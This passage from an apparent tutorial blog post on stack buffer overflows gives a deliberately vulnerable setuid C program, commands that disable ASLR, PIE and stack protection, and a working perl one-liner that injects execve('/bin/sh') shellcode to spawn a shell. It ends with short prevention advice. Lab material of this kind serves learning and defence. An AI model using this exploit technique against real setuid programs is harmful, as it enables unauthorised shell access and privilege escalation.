+  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Terminate line.</span>
+  <span class="token comment">// Closing file</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while closing file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note has been saved.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">free</span><span class="token punctuation">(</span>datafile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc notetaker.c <span class="token parameter variable">-o</span> notetaker <span class="token parameter variable">-g</span>
+<span class="token function">sudo</span> <span class="token function">chown</span> root:root notetaker
+<span class="token function">sudo</span> <span class="token function">chmod</span> u+s notetaker
+./notetaker <span class="token string">"example message"</span>
+</code></pre>
+<p>The second program, the vulnerable one, is used to search notes for the
+current user. Optionally, we can show only the messages that contain a
+specific string.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;sys/stat.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"hacking.h"</span></span>
+
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">FILENAME</span> <span class="token string">"/var/notes"</span></span>
+
+<span class="token keyword">int</span> <span class="token function">print_notes</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Note printing function.</span>
+<span class="token keyword">int</span> <span class="token function">find_user_note</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// Seek in file for a note for user.</span>
+<span class="token keyword">int</span> <span class="token function">search_note</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// Search for keyword function.</span>
+<span class="token keyword">void</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token comment">// Fatal error handler</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> userid<span class="token punctuation">,</span> printing <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> fd<span class="token punctuation">;</span> <span class="token comment">// File descriptor</span>
+  <span class="token keyword">char</span> searchstring<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">)</span>                      <span class="token comment">// If there is an arg,</span>
+    <span class="token function">strcpy</span><span class="token punctuation">(</span>searchstring<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// that is the search string;</span>
+  <span class="token keyword">else</span>                               <span class="token comment">// otherwise,</span>
+    searchstring<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>           <span class="token comment">// search string is empty.</span>
+  userid <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>FILENAME<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Open the file for read-only access.</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while opening file for reading"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%i"</span><span class="token punctuation">,</span> printing<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span>printing<span class="token punctuation">)</span>
+    printing <span class="token operator">=</span> <span class="token function">print_notes</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> userid<span class="token punctuation">,</span> searchstring<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"-------[ end of note data ]-------\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// A function to print the notes for a given uid that match</span>
+<span class="token comment">// an optional search string;</span>
+<span class="token comment">// returns 0 at end of file, 1 if there are still more notes.</span>
+<span class="token keyword">int</span> <span class="token function">print_notes</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">int</span> uid<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>searchstring<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> note_length<span class="token punctuation">;</span>
+  <span class="token keyword">char</span> byte <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> note_buffer<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+  note_length <span class="token operator">=</span> <span class="token function">find_user_note</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>note_length <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>                      <span class="token comment">// If end of file reached,</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>                               <span class="token comment">// return 0.</span>
+  <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> note_buffer<span class="token punctuation">,</span> note_length<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment">// Read note data.</span>
+  note_buffer<span class="token punctuation">[</span>note_length<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>               <span class="token comment">// Terminate the string.</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">search_note</span><span class="token punctuation">(</span>note_buffer<span class="token punctuation">,</span> searchstring<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// If searchstring found,</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span>note_buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">// print the note.</span>
+  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// A function to find the next note for a given userID;</span>
+<span class="token comment">// returns -1 if the end of the file is reached;</span>
+<span class="token comment">// otherwise, it returns the length of the found note.</span>
+<span class="token keyword">int</span> <span class="token function">find_user_note</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">int</span> user_uid<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> note_uid <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+  <span class="token keyword">unsigned</span> <span class="token keyword">char</span> byte<span class="token punctuation">;</span>
+  <span class="token keyword">int</span> length<span class="token punctuation">;</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span>note_uid <span class="token operator">!=</span> user_uid<span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>                                                        <span class="token comment">// Loop until a note for user_uid is found.</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&#x26;</span>note_uid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token comment">// Read the uid data.</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>                                       <span class="token comment">// If 4 bytes aren't read, return end of file code.</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&#x26;</span>byte<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span>                         <span class="token comment">// Read the newline separator.</span>
+        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
+      byte <span class="token operator">=</span> length <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+      <span class="token keyword">while</span> <span class="token punctuation">(</span>byte <span class="token operator">!=</span> <span class="token char">'\n'</span><span class="token punctuation">)</span>
+        <span class="token punctuation">{</span>                                <span class="token comment">// Figure out how many bytes to the end of line.</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&#x26;</span>byte<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// Read a single byte.</span>
+            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>               <span class="token comment">// If byte isn't read, return end of file code.</span>
+          length<span class="token operator">++</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+  <span class="token function">lseek</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> length <span class="token operator">*</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">SEEK_CUR</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Rewind file reading by length bytes.</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] found a %d byte note for user id %d\n"</span><span class="token punctuation">,</span> length<span class="token punctuation">,</span> note_uid<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> length<span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token comment">// A function to search a note for a given keyword;</span>
+<span class="token comment">// returns 1 if a match is found, 0 if there is no match.</span>
+<span class="token keyword">int</span> <span class="token function">search_note</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>note<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>keyword<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> i<span class="token punctuation">,</span> keyword_length<span class="token punctuation">,</span> match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+  keyword_length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>keyword<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>keyword_length <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// If there is no search string,</span>
+    <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token comment">// always "match".</span>
+  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&#x3C;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>note<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+    <span class="token punctuation">{</span>                                  <span class="token comment">// Iterate over bytes in note.</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>note<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> keyword<span class="token punctuation">[</span>match<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// If byte matches keyword,</span>
+        match<span class="token operator">++</span><span class="token punctuation">;</span>                   <span class="token comment">// get ready to check the next byte;</span>
+      <span class="token keyword">else</span>
+        <span class="token punctuation">{</span>                              <span class="token comment">// otherwise,</span>
+          <span class="token keyword">if</span> <span class="token punctuation">(</span>note<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> keyword<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment">// if that byte matches first keyword byte,</span>
+            match <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>             <span class="token comment">// start the match count at 1.</span>
+          <span class="token keyword">else</span>
+            match <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Otherwise it is zero.</span>
+        <span class="token punctuation">}</span>
+      <span class="token keyword">if</span> <span class="token punctuation">(</span>match <span class="token operator">==</span> keyword_length<span class="token punctuation">)</span> <span class="token comment">// If there is a full match,</span>
+        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>                <span class="token comment">// return matched.</span>
+    <span class="token punctuation">}</span>
+  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// Return not matched.</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc notesearch.c <span class="token parameter variable">-o</span> notesearch -fno-stack-protector -no-pie <span class="token parameter variable">-g</span>
+<span class="token function">sudo</span> <span class="token function">chown</span> root:root notesearch
+<span class="token function">sudo</span> <span class="token function">chmod</span> u+s notesearch
+./notesearch <span class="token string">"example"</span>
+</code></pre>
+<p>We need to disable the Adress Space Layout Randomization (ASLR) to avoid
+random memory addreses.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash"><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/randomize_va_space
+</code></pre>
+<p>You may be wondering if ASLR and PIE do the same. Both disable the
+randomization of memory addresses for executables. That’s true. However,
+they randomize different things. ASLR is a kernel protection feature,
+and it has three levels in Linux:</p>
+<ol>
+<li>Disable ASLR. This setting is applied if the kernel is booted with
+the norandmaps boot parameter (in Linux).</li>
+<li>Randomize the positions of the stack, virtual dynamic shared object
+(VDSO) page, and shared memory regions. The base address of the data
+segment is located immediately after the end of the executable code
+segment.</li>
+<li>Randomize the positions of the stack, VDSO page, shared memory
+regions, and the data segment. This is the default setting.</li>
+</ol>
+<p>PIE is a binary protection feature that places the “code segment”, the
+“global offset table” and their “procedure linkage table” at random
+locations.</p>
+<p>The last security protection we need to <a href="https://superuser.com/a/1385242">disable is the NX
+bit</a>. That will make the stack
+executable. In other words, we will be able to execute the shellcode.</p>
+<p>Let’s take a step back. Where is the vulnerability? The notetaker <code>main</code>
+function calls <code>strcpy</code>. Again, there’s no control over the length of
+the copied data. The high-level idea is the same as in the last
+exercise. We want to overwrite the return address to take control of the
+flow. The way to find it is the same. However, the payload is structured
+differently. We aren’t going to send a bunch of “a” followed by a memory
+address in the executable. We want to build a payload that looks like:
+“NOP sled, shellcode, some more NOP operations, NOP sled address”. Let
+me explain each part.</p>
+<p>First, we have the “NOP sled”. A NOP is a no-operation instruction that
+CPUs include for timing purposes, among other things. In our case, we
+use them to force the computer to slide into the shellcode we introduced
+in the stack. Theoretically, you could do it without the aid of a “NOP
+sled”, but it becomes much harder. You will have problems with memory
+alignment and other low-level stuff that I lack knowledge of. Moreover,
+the compiler is picky and won’t allow you to execute the shellcode from
+whatever memory address you want.</p>
+<p>Then, we have the shellcode. A small piece of code built in assembler to
+execute some code. In that example, to give us access to a shell.</p>
+<p>Following the shellcode, we find some more NOP operations. Sometimes,
+shellcodes need to write some bytes after themselves. The compiler can
+complain about that. These NOP operations will help us.</p>
+<p>The last part is the return address. We will overwrite it with a memory
+address where the NOP sled is located.</p>
+<p>That’s it for the structure. Coming back to the exploit, on my first try
+I used a “NOP sled, shellcode, NOP sled address” structure. It didn’t
+work for multiple reasons. NX bit wasn’t disabled and ASLR wasn’t
+disabled.</p>
+<p><img  src="/_astro/notesearch-stack.CuTXw4O9_1HW1IE.webp" alt="" width="1026" height="554" loading="lazy" decoding="async"></p>
+<p>After disabling them, the issue was creating the correct payload.
+Sometimes, the execution failed with a SEGFAULT and sometimes with a
+SIGILL. Trying a myriad of different payload structures and lengths for
+the NOP operations, I finally crafted a payload that worked using gdb.</p>
+<p><img  src="/_astro/notesearch-gdb-exploit.B2R-iprd_Z29ouFF.webp" alt="" width="828" height="368" loading="lazy" decoding="async"></p>
+<p>This payload doesn’t work outside gdb. The environment in which we
+execute the exploit can modify the position of the variables in the
+stack. For example, the environment variables used on gdb differ from
+the ones on the shell. To circumvent that issue, we can pass the
+environment variables to gdb.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash"><span class="token function">env</span> gdb notesearch
+</code></pre>
+<p>The path from where you execute the exploit is also relevant.
+<code>./notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code>
+didn’t work for me, while
+<code>~/Desktop/overflow/notesearch $(perl -e 'print "\x90" x 57, "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05", "\x90" x 40, "\x90\xe3\xff\xff\xff\x7f\x00\x00"')</code>
+worked.</p>
+<p><img  src="/_astro/notesearch-final-exploit.BdbsqXtn_VFSON.webp" alt="" width="968" height="137" loading="lazy" decoding="async"></p>
+<p>That’s it!!! We got our shell. In theory, we should get root access due
+to the SUID permissions. However, some shells now throw SUID permissions
+when spawning new shells from a process with SUID to avoid this kind of
+attacks. More stuff to learn in the future!</p>
+<h1 id="how-can-we-prevent-buffer-overflows">How can we prevent buffer overflows?</h1>
+<p>DON’T COPY DATA WITHOUT CHECKING THE LENGTH!</p>
+<p>Most people forget to do that, so luckily, there are some security
+features that mitigate the attack. We have seen a some of them during
+the exercise: canaries, PIE, ASLR or NX bit.</p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Now we know what a stack based buffer overflow is, why it works, how to
+exploit it and some protections mechanisms. We don’t have an execuse to
+avoid them.</p>  </div> </article> </main> <footer></footer> </body></html>
